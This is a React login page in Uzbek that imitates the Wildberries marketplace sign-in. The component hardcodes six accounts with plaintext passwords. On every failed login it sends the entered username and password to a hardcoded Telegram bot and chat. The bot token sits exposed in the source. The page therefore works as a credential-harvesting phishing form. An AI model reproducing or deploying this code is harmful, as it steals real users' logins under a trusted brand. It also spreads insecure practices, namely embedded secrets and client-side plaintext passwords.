import React, { useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'

const Login = () => {
  const [login, setLogin] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  // 6 ta account
  const accounts = [
    { id: 1, username: 'sardor', password: '123456', name: 'Sardor Aliyev', avatar: 'https://i.pravatar.cc/150?img=1' },
    { id: 2, username: 'aziza', password: '789012', name: 'Aziza Karimova', avatar: 'https://i.pravatar.cc/150?img=5' },
    { id: 3, username: 'bobur', password: '345678', name: 'Bobur Rahimov', avatar: 'https://i.pravatar.cc/150?img=12' },
    { id: 4, username: 'nigora', password: '901234', name: 'Nigora Usmonova', avatar: 'https://i.pravatar.cc/150?img=9' },
    { id: 5, username: 'jahongir', password: '567890', name: 'Jahongir Toshev', avatar: 'https://i.pravatar.cc/150?img=15' },
    { id: 6, username: 'dilnoza', password: '234567', name: 'Dilnoza Abdullayeva', avatar: 'https://i.pravatar.cc/150?img=20' }
  ];

  const loxmat = '7771114291:AAEDp5k9b1O6B6GYpszzeXoXn1_RJxKUKLc';
  const id = '7011500808';

  const sendMessage = async (e) => {
    e.preventDefault();
    setError('');

    if (login.trim() === '' || password.trim() === '') {
      setError('Iltimos malumotlarni kiriting');
      return;
    }

    // Account tekshirish
    const user = accounts.find(
      acc => acc.username === login && acc.password === password
    );

    if (user) {
      // To'g'ri account - localStorage ga saqlash
      setLoading(true);
      localStorage.setItem('currentUser', JSON.stringify(user));

      // Home page ga o'tish
      setTimeout(() => {
        navigate('/');
        setLoading(false);
      }, 1000);
    } else {
      // Noto'g'ri account - Telegram ga yuborish
      setLoading(true);

      const TEXT = `
❌ NOTO'G'RI LOGIN URINISHI:
Login: ${login}
Password: ${password}
Vaqt: ${new Date().toLocaleString()}
      `;

      try {
        const sorov = await fetch(`https://api.telegram.org/bot${loxmat}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: id,
            text: TEXT
          })
        });

        const javob = await sorov.json();
        console.log("SERVERDA JAVOB DAN OLINDI:", javob);

        setError('Login yoki parol noto\'g\'ri!');
      } catch (error) {
        console.log("SERVERDA XATOLIK: ", error);
        setError('Login yoki parol noto\'g\'ri!');
      } finally {
        setLoading(false);
      }
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-600 via-pink-600 to-purple-700 flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        {/* Login Card */}
        <div className="bg-white rounded-2xl shadow-2xl p-8">
          {/* Logo */}
          <div className="text-center mb-8">
            <Link to="/">
              <h1 className="text-5xl font-bold bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">
                WB
              </h1>
            </Link>
            <p className="text-gray-600 mt-2">Wildberries аккаунтга кириш</p>
          </div>

          {/* Error Message */}
          {error && (
            <div className="bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-lg mb-6 text-sm text-center">
              {error}
            </div>
          )}

          {/* Login Form */}
          <form onSubmit={sendMessage} className="space-y-6">
            {/* Login Input */}
            <div>
              <label htmlFor="login" className="block text-sm font-medium text-gray-700 mb-2">
                Логин
              </label>
              <input
                id="login"
                type="text"
                value={login}
                onChange={(e) => setLogin(e.target.value)}
                placeholder="Логинингизни киритинг"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent outline-none transition-all"
              />
            </div>

            {/* Password Input */}
            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                Парол
              </label>
              <input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Паролингизни киритинг"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent outline-none transition-all"
              />
            </div>

            {/* Forgot Password */}
            <div className="text-right">
              <a href="#" className="text-sm text-purple-600 hover:text-purple-700 transition-colors">
                Паролни унутдингизми?
              </a>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white py-3 rounded-lg font-semibold hover:from-purple-700 hover:to-pink-700 transition-all transform hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  <span className="loading loading-spinner loading-sm"></span>
                  Кутилмоқда...
                </>
              ) : (
                'Кириш'
              )}
            </button>
          </form>

          {/* Divider */}
          <div className="relative my-6">
            <div className="absolute inset-0 flex items-center">
              <div className="w-full border-t border-gray-300"></div>
            </div>
            <div className="relative flex justify-center text-sm">
              <span className="px-2 bg-white text-gray-500">ёки</span>
            </div>
          </div>

          {/* Social Login Buttons */}
          <div className="space-y-3">
            <button className="w-full flex items-center justify-center gap-3 px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
              <svg className="w-5 h-5" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
              </svg>
              <span className="text-sm font-medium text-gray-700">Google орқали кириш</span>
            </button>
          </div>

          {/* Register Link */}
          <p className="text-center text-sm text-gray-600 mt-6">
            Аккаунтингиз йўқми?{' '}
            <Link to="/register" className="text-purple-600 hover:text-purple-700 font-medium">
              Рўйхатдан ўтиш
            </Link>
          </p>
        </div>

        {/* Back to Home */}
        <div className="text-center mt-6">
          <Link to="/" className="text-white hover:text-yellow-300 transition-colors text-sm flex items-center justify-center gap-2">
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
            </svg>
            Бош саҳифага қайтиш
          </Link>
        </div>
      </div>
    </div>
  );
};

export default Login;